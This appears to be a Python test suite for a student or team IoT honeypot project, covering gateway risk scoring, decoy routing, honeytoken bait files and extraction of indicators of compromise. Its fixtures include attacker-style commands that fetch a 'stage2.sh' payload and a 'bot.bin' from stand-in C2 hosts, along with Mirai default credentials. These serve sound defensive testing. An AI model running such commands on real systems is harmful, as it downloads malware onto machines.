"""
AegisMirage — Person B Test Suite & Integration Fixtures.

Comprehensive verification of:
1. gateway.py:
   - Configurable scoring and threshold boundaries (real < 20, rate_limit 20-59.9, decoy >= 60).
   - Allowlisting routes to real path without bypassing real-device authentication.
   - Uncertain cases fail-safe to rate_limit.
   - Sticky decisions persist across connections; new evidence causes escalation.
   - Bounded per-source state and TTL expiration.
   - Transport-observed source extraction vs. forged header rejection.
   - Decision computation vs. actual handler enforcement and handler injection.
2. decoy.py:
   - In-memory virtual filesystem navigation and reading.
   - Honeytokens at multiple depths triggering high-confidence flags and Rickroll response.
   - IOC extraction for malware hashes (SHA-256/MD5) and C2 addresses/URLs.
   - Schema compliance with schema.py models (RouteDecision, DecoySessionEvent).
3. Explicit test fixtures for missing teammates' functionality:
   - MockMemberAEdgeMesh (simulates camera network probes).
   - MockMemberCIntelCluster (verifies Stage 3 clustering contract inputs).
"""

import unittest
from typing import Any, Dict

import schema
import gateway
import decoy


# =============================================================================
# Explicit Test Fixtures for Teammates' Functionality
# =============================================================================

class MockMemberAEdgeMesh:
    """
    Test fixture simulating Member A's edge camera mesh.
    Generates synthetic connection attempts from camera field networks.
    """

    def generate_benign_operator_probe(self) -> dict:
        return {
            "source_ip": "127.0.0.1",
            "service": "ssh",
            "creds": ("operator", "ValidOperatorPass2026!"),
            "is_failure": False,
        }

    def generate_scanner_probe(self) -> dict:
        return {
            "source_ip": "194.26.29.50",
            "service": "web",
            "creds": ("admin", "admin"),
            "is_failure": True,
        }

    def generate_anomalous_probe(self) -> dict:
        return {
            "source_ip": "198.51.100.88",
            "service": "rtsp",
            "creds": None,
            "is_failure": False,
        }


class MockMemberCIntelCluster:
    """
    Test fixture simulating Member C's campaign clustering engine.
    Verifies that DecoySessionEvent instances from Person B supply the
    exact required attributes for Stage 3 graph clustering.
    """

    def verify_session_clustering_inputs(self, event: schema.DecoySessionEvent) -> bool:
        assert isinstance(event.session_id, str) and event.session_id
        assert isinstance(event.source_ip, str) and event.source_ip
        assert isinstance(event.service, str) and event.service
        assert isinstance(event.failed_logins, int)
        assert isinstance(event.commands, list)
        assert isinstance(event.honeytoken_hit, bool)
        assert event.malware_hash is None or isinstance(event.malware_hash, str)
        assert event.c2_address is None or isinstance(event.c2_address, str)
        return True


# =============================================================================
# Unit Tests: Gateway Routing (gateway.py)
# =============================================================================

class TestGatewayRouting(unittest.TestCase):

    def setUp(self) -> None:
        gateway.reset_gateway()

    # -------------------------------------------------------------------------
    # Threshold Boundaries
    # -------------------------------------------------------------------------

    def test_threshold_boundary_low_to_real(self) -> None:
        """Score < 20.0 must route to 'real' with low risk explanation."""
        # Single failed login is 15.0 pts (< 20.0)
        decision = gateway.evaluate_route("192.168.1.105", service="web", is_login_failure=True)
        self.assertEqual(decision.destination, "real")
        self.assertEqual(decision.score, 15.0)
        self.assertIn("low risk", decision.reason.lower())

    def test_threshold_boundary_exact_rate_limit(self) -> None:
        """Exact boundary score of 20.0 to 59.9 must trigger fail-safe 'rate_limit'."""
        # Custom config with exact threshold to test boundary
        cfg = gateway.GatewayConfig(
            failed_login_penalty=20.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision("198.51.100.1", service="web", is_login_failure=True)
        self.assertEqual(decision.score, 20.0)
        self.assertEqual(decision.destination, "rate_limit")
        self.assertIn("fail-safe rate limit", decision.reason.lower())

    def test_threshold_boundary_upper_rate_limit(self) -> None:
        """Score just under 60.0 (e.g. 55.0) remains fail-safe 'rate_limit'."""
        cfg = gateway.GatewayConfig(
            failed_login_penalty=55.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision("198.51.100.2", service="web", is_login_failure=True)
        self.assertEqual(decision.score, 55.0)
        self.assertEqual(decision.destination, "rate_limit")

    def test_threshold_boundary_exact_decoy(self) -> None:
        """Score exactly 60.0 or higher routes to 'decoy'."""
        cfg = gateway.GatewayConfig(
            default_creds_penalty=60.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision(
            "203.0.113.1",
            service="ssh",
            attempted_creds=("admin", "admin"),
        )
        self.assertEqual(decision.score, 60.0)
        self.assertEqual(decision.destination, "decoy")
        self.assertIn("hostile threshold", decision.reason.lower())

    # -------------------------------------------------------------------------
    # Allowlisting & Auth Non-Bypass
    # -------------------------------------------------------------------------

    def test_allowlisting_routes_to_real_without_auth_bypass(self) -> None:
        """
        Allowlisted IPs route to 'real', but allowlisting only affects routing.
        It must not bypass real-device authentication.
        """
        decision = gateway.evaluate_route("127.0.0.1", service="ssh")
        self.assertEqual(decision.destination, "real")
        self.assertEqual(decision.score, 0.0)
        self.assertIn("allowlist", decision.reason.lower())
        self.assertIn("requires valid auth", decision.reason.lower())

        # Enforce through handler and verify that real device handler receives the context
        enforced = gateway.handle_request("127.0.0.1", service="ssh", context={"auth_token": None})
        self.assertEqual(enforced["selected_handler"], "real_handler")
        # Real handler processed context; token is still None (no artificial auth bypass)
        self.assertIsNone(enforced["handler_result"]["context"]["auth_token"])

    # -------------------------------------------------------------------------
    # Uncertain Cases Fail-Safe
    # -------------------------------------------------------------------------

    def test_uncertain_reconnaissance_failsafe_rate_limit(self) -> None:
        """Uncertain reconnaissance triggers fail-safe 'rate_limit', never silently decoying."""
        # Touch 1: web service (0 pts)
        gateway.evaluate_route("198.51.100.20", service="web")
        # Touch 2: multi-service probe with single failed login (15 + 15 = 30 pts in [20, 60))
        decision = gateway.evaluate_route("198.51.100.20", service="ssh", is_login_failure=True)
        self.assertEqual(decision.destination, "rate_limit")
        self.assertTrue(20.0 <= decision.score < 60.0)

    # -------------------------------------------------------------------------
    # Sticky Decisions & Escalation
    # -------------------------------------------------------------------------

    def test_sticky_routing_locks_decoy(self) -> None:
        """Once an attacker is trapped in decoy, subsequent probes stay sticky to decoy."""
        first = gateway.evaluate_route(
            "185.220.101.9",
            service="ssh",
            attempted_creds=("root", "123456"),
            is_login_failure=True,
        )
        self.assertEqual(first.destination, "decoy")

        # Second probe without creds from the same IP remains sticky to decoy
        second = gateway.evaluate_route("185.220.101.9", service="web")
        self.assertEqual(second.destination, "decoy")
        self.assertIn("Sticky", second.reason)

    def test_escalation_from_rate_limit_to_decoy_on_new_evidence(self) -> None:
        """New evidence on subsequent connections can escalate rate-limited hosts to decoy."""
        # Probe 1: rate-limited reconnaissance
        gateway.evaluate_route("198.51.100.77", service="web")
        p1 = gateway.evaluate_route("198.51.100.77", service="ssh", is_login_failure=True)
        self.assertEqual(p1.destination, "rate_limit")

        # Probe 2: host attempts Mirai default credentials -> score jumps >= 60 -> escalates to decoy!
        p2 = gateway.evaluate_route(
            "198.51.100.77",
            service="ssh",
            attempted_creds=("admin", "admin"),
            is_login_failure=True,
        )
        self.assertEqual(p2.destination, "decoy")
        self.assertIn("Escalated from rate_limit to decoy", p2.reason)

    # -------------------------------------------------------------------------
    # Bounded State & Expiry (TTL)
    # -------------------------------------------------------------------------

    def test_source_expiry_after_ttl(self) -> None:
        """State resets after session_ttl_seconds has passed."""
        router = gateway.GatewayRouter(
            config=gateway.GatewayConfig(session_ttl_seconds=60.0)
        )
        t0 = 1000.0

        # Initial probe: Mirai credentials -> score 65 -> decoy
        d1 = router.compute_route_decision(
            "203.0.113.99",
            attempted_creds=("admin", "admin"),
            is_login_failure=True,
            now=t0,
        )
        self.assertEqual(d1.destination, "decoy")
        self.assertEqual(d1.score, 65.0)

        # Probe within TTL: remains sticky to decoy
        d2 = router.compute_route_decision("203.0.113.99", service="web", now=t0 + 30.0)
        self.assertEqual(d2.destination, "decoy")

        # Probe after TTL has expired (> 60s inactivity) -> state re-initialized
        t_expired = t0 + 100.0
        d3 = router.compute_route_decision("203.0.113.99", service="web", now=t_expired)
        self.assertEqual(d3.destination, "real")
        self.assertEqual(d3.score, 0.0)

    def test_bounded_state_eviction_on_capacity(self) -> None:
        """Router bounds memory by evicting oldest records when max_tracked_sources is reached."""
        router = gateway.GatewayRouter(
            config=gateway.GatewayConfig(max_tracked_sources=3, session_ttl_seconds=1000.0)
        )
        router.compute_route_decision("10.0.0.1", now=10.0)
        router.compute_route_decision("10.0.0.2", now=20.0)
        router.compute_route_decision("10.0.0.3", now=30.0)
        self.assertEqual(len(router.sources), 3)

        # Adding 4th IP forces eviction of 10.0.0.1 (oldest last_seen)
        router.compute_route_decision("10.0.0.4", now=40.0)
        self.assertEqual(len(router.sources), 3)
        self.assertNotIn("10.0.0.1", router.sources)
        self.assertIn("10.0.0.4", router.sources)

    # -------------------------------------------------------------------------
    # Forged Source Inputs & Transport Extraction
    # -------------------------------------------------------------------------

    def test_forged_forwarded_headers_rejected_by_default(self) -> None:
        """Client-provided X-Forwarded-For is untrusted and ignored by default."""
        router = gateway.GatewayRouter()  # trust_forwarded_headers=False
        actual_peer = "198.51.100.5"
        spoofed_header = "127.0.0.1, 10.0.0.1"

        extracted = router.extract_source_ip(
            transport_peer_ip=actual_peer,
            forwarded_header=spoofed_header,
        )
        self.assertEqual(extracted, actual_peer)
        self.assertNotEqual(extracted, "127.0.0.1")

    def test_trusted_forwarded_headers_when_configured(self) -> None:
        """When explicitly configured behind a trusted proxy, forwarded header is parsed."""
        cfg = gateway.GatewayConfig(trust_forwarded_headers=True)
        router = gateway.GatewayRouter(config=cfg)
        actual_peer = "10.0.0.2"
        spoofed_header = "203.0.113.50, 10.0.0.2"

        extracted = router.extract_source_ip(
            transport_peer_ip=actual_peer,
            forwarded_header=spoofed_header,
        )
        self.assertEqual(extracted, "203.0.113.50")

    # -------------------------------------------------------------------------
    # Decision vs. Enforcement & Handler Selection
    # -------------------------------------------------------------------------

    def test_enforce_route_selects_expected_handlers(self) -> None:
        """Enforcing RouteDecision triggers the specific registered handler."""
        # 1. Real destination
        dec_real = schema.RouteDecision(source_ip="127.0.0.1", destination="real", score=0.0, reason="test")
        res_real = gateway.enforce_route(dec_real)
        self.assertEqual(res_real["selected_handler"], "real_handler")
        self.assertEqual(res_real["handler_result"]["status"], "PASS_THROUGH_DELIVERED")

        # 2. Decoy destination
        dec_decoy = schema.RouteDecision(source_ip="203.0.113.1", destination="decoy", score=80.0, reason="test")
        res_decoy = gateway.enforce_route(dec_decoy)
        self.assertEqual(res_decoy["selected_handler"], "decoy_handler")
        self.assertEqual(res_decoy["handler_result"]["status"], "TRAPPED_IN_DECOY")

        # 3. Rate-limit destination
        dec_limit = schema.RouteDecision(source_ip="198.51.100.1", destination="rate_limit", score=30.0, reason="test")
        res_limit = gateway.enforce_route(dec_limit)
        self.assertEqual(res_limit["selected_handler"], "rate_limit_handler")
        self.assertEqual(res_limit["handler_result"]["status"], "THROTTLED_429")

    def test_custom_handler_injection(self) -> None:
        """Custom handler functions can be injected for real and decoy dispatch."""
        custom_called = []

        def my_real_handler(ctx: Dict[str, Any]) -> str:
            custom_called.append(ctx["source_ip"])
            return "CUSTOM_REAL_CALLED"

        gateway.set_real_device_handler(my_real_handler)
        result = gateway.handle_request("127.0.0.1", service="web")
        self.assertEqual(result["handler_result"], "CUSTOM_REAL_CALLED")
        self.assertIn("127.0.0.1", custom_called)


# =============================================================================
# Unit Tests: Decoy Honeypot (decoy.py)
# =============================================================================

class TestDecoyHoneypot(unittest.TestCase):

    def setUp(self) -> None:
        decoy.reset_decoy_state()

    def test_session_lifecycle_and_commands(self) -> None:
        """Decoy properly runs shell commands and tracks command history."""
        sid = "sess-test-01"
        out_pwd, ev = decoy.execute_decoy_command(sid, "pwd")
        self.assertIn("/", out_pwd)
        self.assertEqual(ev.commands, ["pwd"])

        out_whoami, ev = decoy.execute_decoy_command(sid, "whoami")
        self.assertIn("root", out_whoami)
        self.assertEqual(ev.commands, ["pwd", "whoami"])

    def test_filesystem_navigation(self) -> None:
        """Attacker can cd into directories and ls contents."""
        sid = "sess-test-nav"
        decoy.execute_decoy_command(sid, "cd /etc/camera")
        out_pwd, _ = decoy.execute_decoy_command(sid, "pwd")
        self.assertEqual(out_pwd.strip(), "/etc/camera")

        out_ls, _ = decoy.execute_decoy_command(sid, "ls")
        self.assertIn("credentials.conf", out_ls)

    def test_honeytoken_trip_and_rickroll(self) -> None:
        """Accessing a honeytoken bait file sets honeytoken_hit=True and returns Rickroll."""
        sid = "sess-test-bait"
        _, ev_before = decoy.execute_decoy_command(sid, "ls /etc/camera")
        self.assertFalse(ev_before.honeytoken_hit)

        out_cat, ev_after = decoy.execute_decoy_command(sid, "cat /etc/camera/credentials.conf")
        self.assertTrue(ev_after.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out_cat)
        self.assertIn("HONEYTOKEN COMPROMISE DETECTED", out_cat)

    def test_additional_honeytoken_depths(self) -> None:
        """Honeytokens at /root/keys/vault_token.key and /var/backup/firmware_pass.enc also trip."""
        sid = "sess-test-depth3"
        out1, ev1 = decoy.execute_decoy_command(sid, "cat /root/keys/vault_token.key")
        self.assertTrue(ev1.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out1)

        sid2 = "sess-test-depth3-b"
        out2, ev2 = decoy.execute_decoy_command(sid2, "cat /var/backup/firmware_pass.enc")
        self.assertTrue(ev2.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out2)

    def test_ioc_extraction(self) -> None:
        """Regex IOC extractor extracts SHA-256/MD5 hashes and C2 addresses."""
        sid = "sess-test-ioc"
        cmd = "wget http://194.26.29.112:8080/stage2.sh -O /tmp/x && sha256sum e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        _, ev = decoy.execute_decoy_command(sid, cmd)
        self.assertEqual(ev.c2_address, "http://194.26.29.112:8080/stage2.sh")
        self.assertEqual(ev.malware_hash, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")

    def test_schema_compliance_with_member_c_fixture(self) -> None:
        """DecoySessionEvent validates against Member C's clustering fixture."""
        sid = "sess-contract-test"
        decoy.record_decoy_login(sid, "192.0.2.10", "ssh", "admin", "1234", success=False)
        decoy.execute_decoy_command(sid, "curl http://c2.badbot.cc:9000/bot.bin")
        decoy.execute_decoy_command(sid, "cat /etc/camera/credentials.conf")

        ev = decoy.get_session_by_id(sid)
        self.assertIsNotNone(ev)
        fixture = MockMemberCIntelCluster()
        self.assertTrue(fixture.verify_session_clustering_inputs(ev))


if __name__ == "__main__":
    unittest.main()
